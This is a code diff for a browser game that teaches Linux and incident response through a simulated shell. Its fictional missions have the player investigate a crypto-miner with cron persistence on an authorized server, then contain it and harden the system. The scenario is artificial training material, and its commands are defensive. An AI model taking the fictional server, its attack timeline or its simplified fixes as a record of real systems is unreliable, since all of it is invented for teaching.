+      { t: 'List nearby devices with ip neigh', say: "`ip neigh` lists devices your laptop has seen on the network, with their **MAC** addresses (hardware IDs).", hints: ['', '`ip neigh`'], check: used('ip', 'nullbox', a => /neigh|neighbor|n$/.test(a)), learn: 'neigh' },
+      { t: 'Compare with ~/office/inventory.txt', say: "`cat ~/office/inventory.txt`. Which IP isn't on the list?", hints: ['', '`cat ~/office/inventory.txt`'], check: read('~/office/inventory.txt') },
+      { t: 'Who made it? grep its MAC prefix in ~/tools/oui.txt', say: "The first 3 parts of a MAC address show the manufacturer. The list uses dashes, so search like this:\n`grep -i b8-27-eb ~/tools/oui.txt`", hints: ['grep -i PREFIX FILE', '`grep -i b8-27-eb ~/tools/oui.txt`'], check: used('grep', 'nullbox', a => /b8.27.eb/i.test(a)) },
+      { t: 'Submit the IP of the rogue device', hints: ['It\'s the device not in the inventory.', '`submit 192.168.1.77`'], check: ans('192.168.1.77'), done: "A **Raspberry Pi**! ...oh. It's mine. It runs the coffee machine bot. ☕ Sorry. Still, great instincts: hidden Pis really are used to spy on offices." },
+    ], outro: "Chapter 4 done! Networks are just devices with addresses, and now you can see them." },
+
+  // ---------- CHAPTER 5 ----------
+  { ch: 'INCIDENT RESPONSE', title: 'On Scene', xp: 140,
+    mail: { from: 'Lumen Robotics IT', subj: 'Access for your analyst', body: "Hi {h},\n\nWe've created an account for you on **lumen-web** and added your NULLSEC SSH key. You have **sudo** rights for this investigation.\n\nConnect with: `ssh analyst@lumen-web`\n\nThank you!\nMaya" },
+    intro: ["Lumen gave us **authorized** access to their live server. Time to go on scene. 🕵️", "When you're connected, your prompt will say `analyst@lumen-web`. **Always** check which machine you're on before typing."],
+    objs: [
+      { t: 'Connect: ssh analyst@lumen-web', say: "Type `ssh analyst@lumen-web`. Your key logs you in, no password needed.", hints: ['ssh USER@HOST', '`ssh analyst@lumen-web`'], check: used('ssh', 'nullbox', a => /analyst@lumen-web/.test(a)), learn: 'ssh', done: "You're in. See the prompt? You're now typing **on Lumen's server**." },
+      { t: 'See who logged in recently with last', say: "`last` shows the login history.", hints: ['', '`last`'], check: used('last', 'lumen-web'), learn: 'last', done: "There it is: **svc_deploy** from `" + ATTACKER + "`. Same IP as the logs. Case is tightening." },
+      { t: "Read svc_deploy's .bash_history (you'll need sudo)", say: "Let's see what they typed: `cat /home/svc_deploy/.bash_history`\nPermission denied? Their home folder is private. Use admin rights: put `sudo` in front.", hints: ['sudo + the command', '`sudo cat /home/svc_deploy/.bash_history`'], check: read('/home/svc_deploy/.bash_history', 'lumen-web'), learn: 'history', done: "Their whole playbook: made a hidden folder, downloaded a tool, set up a scheduled task, ran it. Then tried `history -c`, which doesn't delete the saved file. 😏" },
+    ] },
+  { ch: 'INCIDENT RESPONSE', title: 'Persistence', xp: 140,
+    intro: ["Attackers want to **stay**. They set things up to restart automatically. That's called **persistence**."],
+    objs: [
+      { t: 'List the scheduled tasks in /etc/cron.d', say: "`ls /etc/cron.d`, then `cat` anything suspicious.", hints: ['', '`ls /etc/cron.d` then `cat /etc/cron.d/sys-update`'], check: read('/etc/cron.d/sys-update', 'lumen-web'), learn: 'cron' },
+      { t: 'How often does it run? Submit the number of minutes', hints: ['*/5 in the first (minute) field...', '`submit 5`'], check: ans('5', 'every 5 minutes', '5 minutes') },
+      { t: 'Look inside the hidden folder /tmp/.cache', say: "`ls -la /tmp/.cache`, then read `config.json`.", hints: ['', '`cat /tmp/.cache/config.json`'], check: read('/tmp/.cache/config.json', 'lumen-web'), done: "A mining **pool** address and the crew name. It's a **crypto-miner**: it uses Lumen's server to make money for BLACKFERN. That's why it's slow." },
+    ] },
+  { ch: 'INCIDENT RESPONSE', title: 'Catch It Running', xp: 150,
+    intro: ["The miner is running **right now**. Let's catch it in the act."],
+    objs: [
+      { t: 'Check network connections with ss -tnp', say: "`ss -tnp` shows connections and which program owns each one.", hints: ['', '`ss -tnp`'], check: used('ss', 'lumen-web'), learn: 'ss', done: "`kworkerd` is talking to **" + C2 + ":3333**, the mining pool from the payload." },
+      { t: 'Find it in the process list. Submit its PID', say: "`ps aux | grep kworkerd`. The PID is the 2nd column.", hints: ['ps aux lists processes; grep filters them.', `submit ${MINER_PID}`], check: ans(String(MINER_PID)), learn: 'ps', done: "Real kernel threads look like `[kworker/0:1]`, in brackets and owned by root. This fake one belongs to svc_deploy and uses **98% CPU**. Busted." },
+    ], outro: "Chapter 5 done! You've built the full timeline of the attack." },
+
+  // ---------- CHAPTER 6 ----------
+  { ch: 'LOCK IT DOWN', title: 'Contain', xp: 180, meter: true,
+    intro: ["Lumen's site is nearly falling over 🔥 Watch the **SERVER LOAD** meter: every command you type while the miner runs, it climbs.", "Plan: **1.** stop the process, **2.** remove the cron job, **3.** delete the hidden folder. You need `sudo` because those files aren't yours."],
+    objs: [
+      { t: `Stop the miner: sudo kill ${MINER_PID}`, hints: ['sudo kill PID', `\`sudo kill ${MINER_PID}\``], check: state(() => LW().killed), learn: 'kill', done: "Process stopped, load dropping. But in under 5 minutes cron would start it again..." },
+      { t: 'Remove the cron job /etc/cron.d/sys-update', hints: ['sudo rm FILE', '`sudo rm /etc/cron.d/sys-update`'], check: state(() => LW().cron), learn: 'rm' },
+      { t: 'Delete the hidden folder /tmp/.cache', hints: ['Deleting a folder needs -r', '`sudo rm -r /tmp/.cache`'], check: state(() => LW().cache), done: "Miner gone, persistence gone. **Contained.** 🧯" },
+    ] },
+  { ch: 'LOCK IT DOWN', title: 'Harden', xp: 220,
+    intro: ["Now make sure it **can't happen again**. Fix every hole they used."],
+    objs: [
+      { t: `Block the attacker IP with the firewall`, say: "`sudo ufw deny from " + ATTACKER + "`", hints: ['sudo ufw deny from IP', `\`sudo ufw deny from ${ATTACKER}\``], check: state(() => LW().ufw), learn: 'ufw' },
+      { t: 'Lock the stolen svc_deploy account', say: "`sudo passwd -l svc_deploy`", hints: ['passwd -l locks an account', '`sudo passwd -l svc_deploy`'], check: state(() => LW().locked), learn: 'passwd' },
+      { t: 'Delete the exposed backup from the website', say: "It's still in the web folder! `sudo rm /var/www/html/site_backup.bak`", hints: ['', '`sudo rm /var/www/html/site_backup.bak`'], check: state(() => LW().backup) },
+      { t: 'Make /var/www/.env readable by its owner only', say: "Check `ls -la /var/www`. `.env` holds the database password and **everyone** can read it (`rw-r--r--`). Fix it: `sudo chmod 600 /var/www/.env`", hints: ['600 = only the owner can read and write', '`sudo chmod 600 /var/www/.env`'], check: state(() => LW().env), learn: 'chmod' },
+      { t: 'Write your incident report: type report', say: "All fixed! Every case ends with a report. Type `report`.", hints: ['', '`report`'], check: used('report', 'lumen-web'), },
+    ], outro: "🏆 **CASE CLOSED.** {h}, you just did a full incident response: detect → investigate → contain → harden → report. I'm proud of you." },
+];
+const TOTAL_OBJS = MISSIONS.reduce((n, m) => n + m.objs.length, 0);
+const RANKS = [[0, 'Trainee'], [150, 'Junior Analyst'], [450, 'Analyst'], [900, 'Senior Analyst'], [1400, 'Incident Responder'], [1900, 'Threat Hunter']];
+const rankOf = xp => { let r = RANKS[0]; for (const k of RANKS) if (xp >= k[0]) r = k; return r; };
+
+/* ============ shell: sessions & paths ============ */
+let LAPTOP = null, LUMEN = null;
+const sessions = [];
+const cur = () => sessions[sessions.length - 1];
+function norm(sess, p) {
+  if (p == null || p === '') return sess.cwd;
+  if (p === '~' || p.startsWith('~/')) p = sess.home + p.slice(1);
+  if (!p.startsWith('/')) p = (sess.cwd === '/' ? '' : sess.cwd) + '/' + p;
+  const out = [];
+  for (const seg of p.split('/')) { if (!seg || seg === '.') continue; if (seg === '..') out.pop(); else out.push(seg); }
+  return '/' + out.join('/');
+}
+function lookup(sess, abs, sudo) {
+  let n = sess.fs;
+  const blocked = nd => nd.deny && !sudo && nd.own !== sess.user;
+  if (abs !== '/') {
+    for (const part of abs.slice(1).split('/')) {
+      if (n.t !== 'd') return { node: null };
+      if (blocked(n)) return { err: 'denied' };
+      n = n.c[part]; if (!n) return { node: null };
+    }
+  }
+  if (blocked(n)) return { err: 'denied', node: n };
+  return { node: n };
+}
+const splitPath = abs => { const i = abs.lastIndexOf('/'); return [abs.slice(0, i) || '/', abs.slice(i + 1)]; };
+const showPath = (sess, abs) => abs === sess.home ? '~' : abs.startsWith(sess.home + '/') ? '~' + abs.slice(sess.home.length) : abs;
+const canWrite = (sess, dirNode, sudo) => sudo || dirNode.own === sess.user || dirNode.mode === '777';
+const ownerName = nd => nd.own === 'user' ? S.user : nd.own;
+
+/* ============ terminal output ============ */
+const C = (code, s) => `\x1b[${code}m${s}\x1b[0m`;
+const strip = s => s.replace(/\x1b\[[\d;]*m/g, '');
+function ansi(s) {
+  let out = '', open = 0; const parts = s.split(/\x1b\[([\d;]*)m/);
+  for (let i = 0; i < parts.length; i++) {
+    if (i % 2 === 0) out += esc(parts[i]);
+    else if (parts[i] === '0' || parts[i] === '') { out += '</span>'.repeat(open); open = 0; }
+    else { out += `<span class="${parts[i].split(';').map(c => 'c' + c).join(' ')}">`; open++; }
+  }
+  return out + '</span>'.repeat(open);
+}
+const tout = $('termout'), twrap = $('termwrap'), tin = $('tin');
+let lineOut = '';
+function tprint(text) {
+  if (text == null) return;
+  text = String(text); if (text.endsWith('\n')) text = text.slice(0, -1);
+  lineOut += text + '\n';
+  const frag = document.createDocumentFragment();
+  for (const ln of text.split('\n')) { const d = document.createElement('div'); d.innerHTML = ansi(ln); frag.appendChild(d); }
+  tout.appendChild(frag);
+  while (tout.childElementCount > 4000) tout.firstChild.remove();
+  twrap.scrollTop = twrap.scrollHeight;
+}
+function tprintHTML(html) { const d = document.createElement('div'); d.innerHTML = html; tout.appendChild(d); twrap.scrollTop = twrap.scrollHeight; }
+function promptStr() {
+  const s = cur();
+  return `${C('1;32', s.user + '@' + s.host)}:${C('1;36', showPath(s, s.cwd))}$ `;
+}
+function renderPrompt() { $('ps').innerHTML = ansi(promptStr()); $('termtitle').textContent = `${cur().user}@${cur().host}: ${showPath(cur(), cur().cwd)}`; }
+
+/* ============ tokenizer & parser ============ */
+function expandVars(s, sess) {
+  return s.replace(/\$(\w+|\?)/g, (m, v) => ({ HOME: sess.home, USER: sess.user, PWD: sess.cwd, HOSTNAME: sess.host, SHELL: '/bin/bash', '?': String(lastCode) }[v] ?? ''));
+}
+function tokenize(line, sess) {
+  const toks = []; let cur = null, i = 0;
+  const push = () => { if (cur) { toks.push(cur); cur = null; } };
+  while (i < line.length) {
+    const ch = line[i];
+    if (ch === ' ' || ch === '\t') { push(); i++; continue; }
+    if (ch === '#' && !cur) break;
+    if (ch === '2' && !cur && line[i + 1] === '>') { push(); toks.push({ op: '2>' }); i += 2; continue; }
+    if ('|;<>&'.includes(ch)) {
+      push();
+      if (ch === '>' && line[i + 1] === '>') { toks.push({ op: '>>' }); i += 2; continue; }
+      if (ch === '&' && line[i + 1] === '&') { toks.push({ op: '&&' }); i += 2; continue; }
+      if (ch === '|' && line[i + 1] === '|') { toks.push({ op: '||' }); i += 2; continue; }
+      if (ch === '&') { toks.push({ op: '&' }); i++; continue; }
+      toks.push({ op: ch }); i++; continue;
+    }
+    if (!cur) cur = { v: '', q: false, glob: false };
+    if (ch === "'") { const j = line.indexOf("'", i + 1); if (j < 0) throw new Error('unexpected EOF while looking for matching `\''); cur.v += line.slice(i + 1, j); cur.q = true; i = j + 1; continue; }
+    if (ch === '"') {
+      let j = i + 1, s = '';
+      while (j < line.length && line[j] !== '"') { if (line[j] === '\\' && j + 1 < line.length) { s += line[j + 1]; j += 2; } else s += line[j++]; }
+      if (j >= line.length) throw new Error('unexpected EOF while looking for matching `"\'');
+      cur.v += expandVars(s, sess); cur.q = true; i = j + 1; continue;
+    }
+    if (ch === '\\' && i + 1 < line.length) { cur.v += line[i + 1]; i += 2; continue; }
+    if (ch === '$') { const m = /^\$(\w+|\?)/.exec(line.slice(i)); if (m) { cur.v += expandVars(m[0], sess); i += m[0].length; continue; } }
+    if (ch === '~' && cur.v === '' && (line[i + 1] === undefined || line[i + 1] === '/' || line[i + 1] === ' ')) { cur.v += sess.home; i++; continue; }
+    if (ch === '*' || ch === '?' || ch === '[') cur.glob = true;
+    cur.v += ch; i++;
+  }
+  push();
+  return toks;
+}
+function globRe(p) { return new RegExp('^' + p.replace(/[.+^${}()|\\]/g, '\\$&').replace(/\*/g, '.*').replace(/\?/g, '.') + '$'); }
+function expandGlob(tok, sess) {
+  if (!tok.glob || tok.q) return [tok.v];
+  const v = tok.v, slash = v.lastIndexOf('/'), dirPart = slash >= 0 ? v.slice(0, slash + 1) : '', base = v.slice(slash + 1);
+  if (/[*?[]/.test(dirPart)) return [v];
+  const r = lookup(sess, norm(sess, dirPart || '.'), false);
+  if (!r.node || r.node.t !== 'd') return [v];
+  const re = globRe(base);
+  const m = Object.keys(r.node.c).filter(n => re.test(n) && (base.startsWith('.') || !n.startsWith('.'))).sort();
+  return m.length ? m.map(n => dirPart + n) : [v];
+}
+function parse(line, sess) {
+  const toks = tokenize(line, sess), stmts = [];
+  let pl = { cmds: [], op: null }, cmd = { argv: [] };
+  const endCmd = () => { if (cmd.argv.length || cmd.inFile) pl.cmds.push(cmd); else if (pl.cmds.length || pl.out) throw new Error("syntax error near unexpected token `|'"); cmd = { argv: [] }; };
+  const endPl = op => { endCmd(); if (pl.cmds.length) stmts.push(pl); pl = { cmds: [], op }; };
+  for (let i = 0; i < toks.length; i++) {
+    const t = toks[i];
+    if (t.op) {
+      if (t.op === '|') { if (!cmd.argv.length) throw new Error("syntax error near unexpected token `|'"); endCmd(); }
+      else if (t.op === ';' || t.op === '&&' || t.op === '||' || t.op === '&') endPl(t.op === '&' ? ';' : t.op);
+      else {
+        const nx = toks[i + 1]; if (!nx || nx.op) throw new Error("syntax error near unexpected token `newline'");
+        i++;
+        if (t.op === '<') cmd.inFile = nx.v;
+        else if (t.op === '2>') pl.errNull = nx.v === '/dev/null' ? true : nx.v;
+        else { pl.out = nx.v; pl.append = t.op === '>>'; }
+      }
+      continue;
+    }
+    for (const v of expandGlob(t, sess)) cmd.argv.push(v);
+  }
+  endPl(null);
+  return stmts;
+}
+
+/* ============ runner ============ */
+let busy = false, abortFlag = false, lastCode = 0, lineReads = [], lineCmds = [], pwResolve = null;
+const hist = []; let hidx = 0;
+class Abort extends Error {}
+function mkSleep() { return async ms => { const end = Date.now() + ms; while (Date.now() < end) { if (abortFlag) throw new Abort(); await sleep(Math.min(40, end - Date.now())); } if (abortFlag) throw new Abort(); }; }
+async function runLine(line) {
+  lineOut = ''; lineReads = []; lineCmds = [];
+  let stmts;
+  try { stmts = parse(line, cur()); }
+  catch (e) { tprint(C(31, '-bash: ' + e.message)); return; }
+  let prevOp = null;
+  for (const pl of stmts) {
+    if (prevOp === '&&' && lastCode !== 0) { prevOp = pl.op; continue; }
+    if (prevOp === '||' && lastCode === 0) { prevOp = pl.op; continue; }
+    try { lastCode = await runPipeline(pl); }
+    catch (e) { if (e instanceof Abort) { tprint('^C'); lastCode = 130; break; } console.error(e); tprint(C(31, 'error: ' + e.message)); lastCode = 1; }
+    prevOp = pl.op;
+  }
+}
+async function runPipeline(pl) {
+  let stdin = null, code = 0;
+  for (let i = 0; i < pl.cmds.length; i++) {
+    const cmd = pl.cmds[i], isLast = i === pl.cmds.length - 1, tty = isLast && !pl.out;
+    const sess = cur();
+    let input = stdin;
+    const ctx = {
+      sess, tty, sudo: false, stdin: input,
+      out: s => { if (tty) tprint(s); else buf.push(s); },
+      err: s => { if (pl.errNull !== true) tprint(C(31, s)); },
+      sleep: mkSleep(),
+    };
+    const buf = [];
+    if (cmd.inFile != null) {
+      const s = readText(ctx, cmd.inFile, '-bash');
+      if (s == null) { code = 1; stdin = ''; continue; }
+      ctx.stdin = s;
+    }
+    code = await execArgv(cmd.argv, ctx);
+    stdin = strip(buf.join(''));
+  }
+  if (pl.out) {
+    const sess = cur(), abs = norm(sess, pl.out), [dir, name] = splitPath(abs), r = lookup(sess, dir, false);
+    if (!r.node || r.node.t !== 'd') { tprint(C(31, `-bash: ${pl.out}: No such file or directory`)); return 1; }
+    if (!canWrite(sess, r.node, false)) { tprint(C(31, `-bash: ${pl.out}: Permission denied`)); return 1; }
+    const ex = r.node.c[name];
+    if (ex && ex.t === 'd') { tprint(C(31, `-bash: ${pl.out}: Is a directory`)); return 1; }
+    if (ex && pl.append) ex.s += stdin || '';
+    else r.node.c[name] = { t: 'f', s: stdin || '', own: sess.user === S.user ? 'user' : sess.user, mode: '644' };
+  }
+  return code;
+}
+async function execArgv(argv, ctx) {
+  if (!argv.length) return 0;
+  let [name, ...args] = argv;
+  if (ALIAS[name]) { const a = ALIAS[name].split(' '); name = a[0]; args = a.slice(1).concat(args); }
+  lineCmds.push({ name, args, host: ctx.sess.host, sudo: ctx.sudo });
+  const fn = CMDS[name];
+  if (!fn) {
+    ctx.err(`${name}: command not found`);
+    if (/^(cls|dir)$/i.test(name)) ctx.err(C(90, `  (that's a Windows command. On Linux try: ${name.toLowerCase() === 'cls' ? 'clear' : 'ls'})`));
+    return 127;
+  }
+  const r = await fn(args, ctx);
+  return typeof r === 'number' ? r : 0;
+}
+function readText(ctx, p, name) {
+  const sess = ctx.sess, abs = norm(sess, p), r = lookup(sess, abs, ctx.sudo);
+  if (r.err) { ctx.err(`${name}: ${p}: Permission denied`); if (sess.host === 'lumen-web') tipSudo(); return null; }
+  if (!r.node) { ctx.err(`${name}: ${p}: No such file or directory`); return null; }
+  if (r.node.t === 'd') { ctx.err(`${name}: ${p}: Is a directory`); return null; }
+  lineReads.push({ host: sess.host, abs });
+  return r.node.s;
+}
+let sudoTipShown = false;
+function tipSudo() { if (!sudoTipShown) { sudoTipShown = true; setTimeout(() => tprint(C(90, '  tip: this file belongs to another user. Admins can use: sudo <command>')), 0); } }
+function getInput(ctx, files, name) {
+  if (!files.length || (files.length === 1 && files[0] === '-')) {
+    if (ctx.stdin == null) { ctx.err(`${name}: missing file operand (give it a file name, or pipe text into it)`); return null; }
+    return [{ name: '-', s: ctx.stdin }];
+  }
+  const out = [];
+  for (const f of files) { const s = readText(ctx, f, name); if (s != null) out.push({ name: f, s }); }
+  return out;
+}
+function parseOpts(args, valOpts = '') {
+  const flags = new Set(), vals = {}, rest = []; let stop = false;
+  for (let i = 0; i < args.length; i++) {
+    const a = args[i];
+    if (stop || a === '-' || !a.startsWith('-') || /^-\d+$/.test(a)) { rest.push(a); continue; }
+    if (a === '--') { stop = true; continue; }
+    if (a.startsWith('--')) { const eq = a.indexOf('='); const k = eq < 0 ? a.slice(2) : a.slice(2, eq); vals[k] = eq < 0 ? true : a.slice(eq + 1); flags.add(k); continue; }
+    for (let j = 1; j < a.length; j++) {
+      const ch = a[j];
+      if (valOpts.includes(ch)) { vals[ch] = a.slice(j + 1) || args[++i]; flags.add(ch); break; }
+      flags.add(ch);
+    }
+  }
+  return { flags, vals, rest };
+}
+const lines = s => { const a = s.split('\n'); if (a[a.length - 1] === '') a.pop(); return a; };
+function walk(sess, abs, node, cb, sudo, errCb) {
+  cb(abs, node);
+  if (node.t !== 'd') return;
+  if (node.deny && !sudo && node.own !== sess.user) { errCb && errCb(abs); return; }
+  for (const k of Object.keys(node.c).sort()) walk(sess, abs === '/' ? '/' + k : abs + '/' + k, node.c[k], cb, sudo, errCb);
+}
+function permStr(nd) { const map = ['---', '--x', '-w-', '-wx', 'r--', 'r-x', 'rw-', 'rwx']; return (nd.t === 'd' ? 'd' : '-') + [...(nd.mode || '644')].map(d => map[+d]).join(''); }
+function colorName(n, nd) { return nd.t === 'd' ? C('1;34', n) : /[157]/.test((nd.mode || '644')[0]) ? C('1;32', n) : n; }
+
+/* ============ network & processes (simulated) ============ */
+const HOSTS = { 'localhost': '127.0.0.1', 'router': '192.168.1.1', 'gateway': '192.168.1.1', 'lumen-web': '10.20.0.5', 'nullbox': '127.0.1.1' };
+const ALIVE = { '127.0.0.1': 0.04, '127.0.1.1': 0.04, '192.168.1.1': 2.1, '192.168.1.20': 4.3, '192.168.1.31': 6.8, '192.168.1.77': 3.2, '10.20.0.5': 18.5 };
+function procs(sess) {
+  if (sess.host !== 'lumen-web') return [
+    ['root', 1, 0.0, 0.1, '?', 'Ss', '08:00', '/sbin/init'], ['root', 402, 0.0, 0.2, '?', 'Ss', '08:00', '/usr/sbin/NetworkManager'],
+    [S.user, 1200, 0.3, 1.1, '?', 'Sl', '08:01', 'nullsec-chat --ghost'], [S.user, 1311, 0.0, 0.0, 'pts/0', 'Ss', '08:02', '-bash']];
+  const p = [
+    ['root', 1, 0.0, 0.1, '?', 'Ss', 'Mar14', '/sbin/init'], ['root', 22, 0.0, 0.0, '?', 'I', 'Mar14', '[kworker/0:1-events]'], ['root', 23, 0.0, 0.0, '?', 'I', 'Mar14', '[kworker/1:0-mm_percpu_wq]'],
+    ['root', 612, 0.0, 0.1, '?', 'Ss', 'Mar14', 'sshd: /usr/sbin/sshd -D'], ['root', 655, 0.0, 0.0, '?', 'Ss', 'Mar14', '/usr/sbin/cron -f'],
+    ['www-data', 701, LW().killed ? 0.4 : 0.1, 0.4, '?', 'S', 'Mar14', 'nginx: worker process']];
+  if (!LW().killed) p.push(['svc_deploy', MINER_PID, 98.7, 4.2, '?', 'Rl', '02:14', '/tmp/.cache/kworkerd --quiet']);
+  p.push(['analyst', 5011, 0.0, 0.0, 'pts/0', 'Ss', '09:30', '-bash']);
+  return p;
+}
+
+/* ============ commands ============ */
+const ALIAS = { ll: 'ls -la', la: 'ls -a', ifconfig: 'ip a' };
+const CMDS = {
+  help(args, ctx) {
+    const g = (t, l) => C('1;35', t) + '\n' + l.map(([c, d]) => '  ' + C(36, c.padEnd(26)) + d).join('\n') + '\n';
+    ctx.out(g('BASICS', [['ls [-la] [folder]', 'list files'], ['cd <folder>', 'change folder  (.. = up, ~ = home)'], ['pwd', 'where am I?'], ['cat <file>', 'print a file'], ['clear', 'clear the screen'], ['history', 'commands you typed']]) +
+      g('SEARCH', [['grep [-inv] <word> <file>', 'find lines containing a word'], ['find <folder> -name "*.txt"', 'find files by name'], ['head / tail -n 5 <file>', 'first / last lines'], ['wc -l <file>', 'count lines'], ['sort, uniq -c, cut, awk', 'slice and count text'], ['a | b', 'pipe: send output of a into b']]) +
+      g('CODES', [['base64 [-d] <file>', 'encode / decode Base64'], ["tr 'A-Z' 'a-z'", 'swap characters'], ['xxd [-r -p] <file>', 'hex dump / undo hex'], ['md5sum / sha256sum', 'file fingerprints']]) +
+      g('NETWORK & SYSTEM', [['ip a / ip neigh', 'your IP / devices nearby'], ['ping -c 4 <host>', 'is it alive?'], ['ssh user@host', 'log in to another machine'], ['ss -tnp', 'network connections'], ['ps aux', 'running programs'], ['last', 'login history'], ['sudo <command>', 'run as admin']]) +
+      g('GAME', [['hint', 'get a hint for the current objective'], ['submit <answer>', 'send an answer to Ghost'], ['man <command>', 'explain a command']]) +
+      C(90, 'Keys: Tab = auto-complete · ↑/↓ = history · Ctrl+C = stop · Ctrl+L = clear'));
+  },
+  man(args, ctx) {
+    if (!args[0]) { ctx.err('What manual page do you want?\nFor example, try \'man ls\'.'); return 1; }
+    const key = { 'ls': 'ls', cat: 'cat', pwd: 'pwd', cd: 'cd', grep: 'grep', find: 'find', wc: 'wc', base64: 'base64', tr: 'tr', xxd: 'xxd', sha256sum: 'hash', md5sum: 'hash', ip: 'ip', ping: 'ping', ssh: 'ssh', sudo: 'sudo', last: 'last', ps: 'ps', ss: 'ss', kill: 'kill', rm: 'rm', ufw: 'ufw', passwd: 'passwd', chmod: 'chmod', crontab: 'cron', cron: 'cron', history: 'history' }[args[0]];
+    const c = CARDS[key];
+    if (!c) { const d = EXTRA_MAN[args[0]]; if (d) { ctx.out(C(1, args[0]) + ' - ' + d); return 0; } ctx.err(`No manual entry for ${args[0]}`); return 16; }
+    ctx.out(C('1;35', `${c.cmd} — ${c.title}`) + '\n' + strip(fmt(c.what).replace(/<[^>]+>/g, '')) + '\n\n' + fmt(c.real).replace(/<br>/g, '\n').replace(/<[^>]+>/g, '') + '\n\n' + C(36, 'Examples:') + '\n' + fmt(c.ex).split('\n').map(l => '  ' + l).join('\n'));
+  },
+  clear() { tout.innerHTML = ''; },
+  pwd(args, ctx) { ctx.out(ctx.sess.cwd); },
+  whoami(args, ctx) { ctx.out(ctx.sudo ? 'root' : ctx.sess.user); },
+  hostname(args, ctx) { ctx.out(ctx.sess.host); },
+  id(args, ctx) { const u = ctx.sudo ? 'root' : ctx.sess.user; ctx.out(u === 'root' ? 'uid=0(root) gid=0(root) groups=0(root)' : `uid=1000(${u}) gid=1000(${u}) groups=1000(${u})${ctx.sess.host === 'lumen-web' ? ',27(sudo)' : ''}`); },
+  date(args, ctx) { ctx.out(new Date().toString().replace(/ \(.*\)/, '')); },
+  uname(args, ctx) { ctx.out(args.includes('-a') ? `Linux ${ctx.sess.host} 6.5.0-nullsec #1 SMP x86_64 GNU/Linux` : 'Linux'); },
+  echo(args, ctx) { let n = false; if (args[0] === '-n') { n = true; args = args.slice(1); } if (args[0] === '-e') args = args.slice(1); const s = args.join(' '); if (ctx.tty) { if (s) ctx.out(s); else ctx.out('\n'); } else ctx.out(s + (n ? '' : '\n')); },
+  history(args, ctx) { ctx.out(hist.map((h, i) => String(i + 1).padStart(5) + '  ' + h).join('\n')); },
+  exit(args, ctx) {
+    if (sessions.length > 1) { const s = sessions.pop(); ctx.out(`logout\nConnection to ${s.host} closed.`); updateMeter(); return 0; }
+    ctx.out(C(90, "This is your own laptop, so there's nowhere to exit to. (On a remote server, exit takes you back home.)"));
+  },
+  ls(args, ctx) {
+    const { flags, rest } = parseOpts(args);
+    const all = flags.has('a') || flags.has('A'), long = flags.has('l');
+    const targets = rest.length ? rest : ['.'];
+    let code = 0; const blocks = [];
+    for (const t of targets) {
+      const abs = norm(ctx.sess, t), r = lookup(ctx.sess, abs, ctx.sudo);
+      if (r.err) { ctx.err(`ls: cannot open directory '${t}': Permission denied`); if (ctx.sess.host === 'lumen-web') tipSudo(); code = 2; continue; }
+      if (!r.node) { ctx.err(`ls: cannot access '${t}': No such file or directory`); code = 2; continue; }
+      let entries;
+      if (r.node.t === 'f') entries = [[t, r.node]];
+      else {
+        entries = Object.keys(r.node.c).filter(n => all || !n.startsWith('.')).sort((a, b) => a.replace(/^\./, '').localeCompare(b.replace(/^\./, ''))).map(n => [n, r.node.c[n]]);
+        if (flags.has('a')) entries.unshift(['.', r.node], ['..', r.node]);
+      }
+      let s = targets.length > 1 && r.node.t === 'd' ? t + ':\n' : '';
+      if (long) {
+        if (r.node.t === 'd') s += `total ${entries.length * 4}\n`;
+        s += entries.map(([n, nd]) => `${permStr(nd)} 1 ${ownerName(nd).padEnd(10)} ${ownerName(nd).padEnd(10)} ${String(nd.t === 'd' ? 4096 : nd.s.length).padStart(6)} Mar 14 09:12 ${ctx.tty ? colorName(n, nd) : n}`).join('\n');
+      } else s += entries.map(([n, nd]) => ctx.tty ? colorName(n, nd) : n).join(ctx.tty ? '  ' : '\n');
+      blocks.push(s);
+    }
+    const o = blocks.filter(b => b !== '').join('\n\n');
+    if (o) ctx.out(o + '\n');
+    return code;
+  },
+  cd(args, ctx) {
+    const sess = ctx.sess;
+    let t = args[0];
+    if (args.length > 1) { ctx.err('-bash: cd: too many arguments'); return 1; }
+    if (t === undefined) t = sess.home;
+    if (t === '-') { if (!sess.prev) { ctx.err('-bash: cd: OLDPWD not set'); return 1; } t = sess.prev; ctx.out(t); }
+    const abs = norm(sess, t), r = lookup(sess, abs, false);
+    if (r.err) { ctx.err(`-bash: cd: ${t}: Permission denied`); return 1; }
+    if (!r.node) { ctx.err(`-bash: cd: ${t}: No such file or directory`); return 1; }
+    if (r.node.t !== 'd') { ctx.err(`-bash: cd: ${t}: Not a directory`); return 1; }
+    sess.prev = sess.cwd; sess.cwd = abs;
+  },
+  cat(args, ctx) {
+    const { flags, rest } = parseOpts(args);
+    const ins = getInput(ctx, rest, 'cat'); if (!ins) return 1;
+    let s = ins.map(x => x.s).join('');
+    if (flags.has('n')) s = lines(s).map((l, i) => String(i + 1).padStart(6) + '  ' + l).join('\n') + '\n';
+    if (s) ctx.out(s);
+    return ins.length === rest.length || !rest.length ? 0 : 1;
+  },
+  head(args, ctx) { return headTail(args, ctx, 'head'); },
+  tail(args, ctx) { return headTail(args, ctx, 'tail'); },
+  grep(args, ctx) {
+    const { flags, vals, rest } = parseOpts(args, 'em');
+    const pat = vals.e != null ? vals.e : rest.shift();
+    if (pat == null) { ctx.err("Usage: grep [OPTION]... PATTERNS [FILE]...\nTry 'grep --help' for more information."); return 2; }
+    const ic = flags.has('i'), inv = flags.has('v'), num = flags.has('n'), cnt = flags.has('c'), rec = flags.has('r') || flags.has('R'), onlyNames = flags.has('l'), word = flags.has('w');
+    let re;
+    try { let src = flags.has('F') ? pat.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') : pat.replace(/\\\|/g, '|'); if (word) src = `\\b(?:${src})\\b`; re = new RegExp(src, ic ? 'gi' : 'g'); }
+    catch (e) { re = new RegExp(pat.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), ic ? 'gi' : 'g'); }
+    let srcs = [];
+    if (rec) {
+      const roots = rest.length ? rest : ['.'];
+      for (const rt of roots) {
+        const abs = norm(ctx.sess, rt), r = lookup(ctx.sess, abs, ctx.sudo);
+        if (!r.node) { ctx.err(`grep: ${rt}: No such file or directory`); continue; }
+        walk(ctx.sess, abs, r.node, (p, nd) => { if (nd.t === 'f') { lineReads.push({ host: ctx.sess.host, abs: p }); srcs.push({ name: rt === '.' ? p.replace(ctx.sess.cwd + '/', '') : (rt.endsWith('/') ? rt.slice(0, -1) : rt) + p.slice(abs.length), s: nd.s }); } }, ctx.sudo, d => ctx.err(`grep: ${d}: Permission denied`));
+      }
+    } else {
